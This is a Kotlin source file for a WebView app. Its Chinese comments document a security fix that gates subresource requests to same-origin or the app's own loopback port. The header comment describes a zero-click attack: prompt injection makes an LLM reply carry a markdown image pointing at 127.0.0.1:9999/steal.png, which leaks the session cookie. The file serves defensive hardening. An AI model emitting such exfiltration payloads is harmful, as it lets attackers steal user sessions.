package com.dsh.core

/**
 * ★ R49/S-01 补（R2-SECURITY §1.4）：**子资源**的 origin 门。
 *
 * ## 为什么导航门不够（这是 R2 验收发现的真洞，且比 S-01 原文更严重）
 *
 * `shouldOverrideUrlLoading` 只管**导航**。子资源（`<img>` / `<link>` / `<script>` / `fetch`）
 * **不走它**，所以 S-01 修好的端口门对它们完全无效。
 *
 * 而出货前端会渲染远程图片。以下是出货产物 `dsh-web-frontend/dist/assets/index-8VXBH-f-.js`
 * 里的真实代码（`loading:"lazy"` 只影响时机，不影响是否请求）：
 *
 * ```js
 * jsx("img", { className: pe.image, src: e, alt: r, onError: () => { l(!0) },
 *              loading: "lazy", decoding: "async", referrerPolicy: "no-referrer" })
 * ```
 *
 * `src` 由 `remoteImageUrl` 放行 `http:` / `https:`，**没有 host / port 限制**；
 * 而出货 `dist/index.html` **没有任何 CSP**（`grep -c Content-Security-Policy` = 0）。
 *
 * ### 攻击场景（零点击）
 *
 * 1. rootfs 内某进程（或 prompt-injection 让模型输出）在 `127.0.0.1:9999` 起监听；
 * 2. LLM 回复里带 `![](http://127.0.0.1:9999/steal.png)`；
 * 3. 前端渲染成 `<img src=…>` ⇒ WebView 发起**子资源请求**；
 * 4. cookie 按 host 存（RFC 6265 **不含端口**），`dsh-auth-<sha256(authority)>` 的 Path 是 `/`
 *    ⇒ Chromium 对同 host 同 scheme 的子资源**照带 cookie**；
 * 5. 攻击者从 `Cookie:` 头拿到会话 cookie，再用它访问真实端口。
 *
 * 与 S-01 修掉的那条相比：**这条不需要用户点任何东西**，只要消息被渲染出来。
 *
 * ## 判据
 *
 * 子资源**只允许**两类来源：
 * 1. **同源**（与主文档 scheme+host+port 完全一致）—— 正常加载自己的 JS/CSS/字体；
 * 2. **回环上的同端口**（`127.0.0.1:<expectedPort>` / `localhost:<expectedPort>`）——
 *    dsh 自己也可能从回环取资源。
 *
 * 其余一律拒（含**回环上的其他端口** —— 那正是攻击点）。
 *
 * ### 为什么不用"允许所有 http(s)"
 * 那就等于没有这道门。远程图片（`https://example.com/x.png`）会被一起拦掉，看起来是功能退化 ——
 * 但**正确做法是让图片走 dsh 自己的代理**（服务端 fetch 后同源返回），而不是让 WebView
 * 带着 cookie 去访问任意 origin。这条取舍写在 [subresourceOriginAllowed] 的 KDoc 里。
 *
 * @param requestUrl 子资源的 URL
 * @param pageUrl 主文档的 URL（WebView 当前的 `view.url`）；null = 还不知道 ⇒ 取严
 * @param expectedPort dsh 的端口（<=0 = 不可知 ⇒ 回环那一条弃权，见下）
 */
fun subresourceOriginAllowed(
    requestUrl: String?,
    pageUrl: String?,
    expectedPort: Int
): Boolean {
    if (requestUrl.isNullOrBlank()) return false
    // 非 http(s) 一律拒：data: / blob: 本来不走这个回调，file: / content: 不该出现在本地 UI 里。
    if (!UrlScanner.hasHttpScheme(requestUrl)) return false

    // ① 同源：scheme + host + port 三者全等才算。
    //    只比 host 是不够的 —— 同 host 不同端口正是 S-01 的缺陷形态。
    if (pageUrl != null) {
        val reqOrigin = originOf(requestUrl)
        val pageOrigin = originOf(pageUrl)
        if (reqOrigin != null && reqOrigin == pageOrigin) return true
    }

    // ② 回环 + 预期端口：dsh 从自己的回环地址取资源。
    //    expectedPort <= 0（自动端口档、还没拿到 READY）⇒ 这一条**弃权**，
    //    与 webUiPortAllowed 的极性一致（端口不可知时这一维不校验）。
    if (expectedPort > 0) {
        val host = hostOf(requestUrl)?.lowercase()
        if (host == "127.0.0.1" || host == "localhost") {
            if (UrlScanner.portOf(requestUrl) == expectedPort) return true
        }
    }

    return false
}

/**
 * 取 `scheme://host[:port]` 形态的 origin（端口缺省时按 scheme 补默认值）。
 *
 * 为什么必须补默认端口：`http://127.0.0.1/x` 与 `http://127.0.0.1:80/x` 是同一个 origin，
 * 不懂略写会判成不同源 —— 那个方向的误判是"拦掉合法请求"，比放过更安全，但会让
 * 同源加载莫名失败，得不偿失。
 *
 * 解析失败返回 null（调用方按"不同源"处理）。
 */
private fun originOf(url: String): String? {
    val scheme = schemeOf(url)?.lowercase() ?: return null
    val host = hostOf(url)?.lowercase() ?: return null
    val port = UrlScanner.portOf(url) ?: defaultPortOf(scheme) ?: return null
    return "$scheme://$host:$port"
}

private fun schemeOf(url: String): String? {
    val i = url.indexOf("://")
    if (i <= 0) return null
    return url.substring(0, i)
}

/**
 * 取 host（剥 userinfo、剥 IPv6 方括号、剥端口）。
 *
 * 为什么手写而不是 `java.net.URI`：这个函数会在**每个子资源请求**上跑（一张页面几十上百次），
 * 而 `URI.create` 对畸形输入要抛异常走 catch。手写的成本是常数级、且对畸形输入天然返回 null。
 * （与 `UrlScanner` 里的既有做法一致。）
 */
private fun hostOf(url: String): String? {
    val schemeEnd = url.indexOf("://")
    if (schemeEnd <= 0) return null
    var rest = url.substring(schemeEnd + 3)
    // 去掉 path / query / fragment
    val stop = rest.indexOfFirst { it == '/' || it == '?' || it == '#' }
    if (stop >= 0) rest = rest.substring(0, stop)
    // 去掉 userinfo（`user:pw@host`）—— 不能把 userinfo 当 host
    val at = rest.lastIndexOf('@')
    if (at >= 0) rest = rest.substring(at + 1)
    if (rest.isEmpty()) return null
    return when {
        rest.startsWith("[") -> {           // IPv6 字面量 [::1]:8080
            val close = rest.indexOf(']')
            if (close < 0) null else rest.substring(1, close)
        }
        else -> {
            val colon = rest.lastIndexOf(':')
            if (colon >= 0) rest.substring(0, colon) else rest
        }
    }?.takeIf { it.isNotEmpty() }
}

private fun defaultPortOf(scheme: String): Int? = when (scheme) {
    "http" -> 80
    "https" -> 443
    else -> null
}
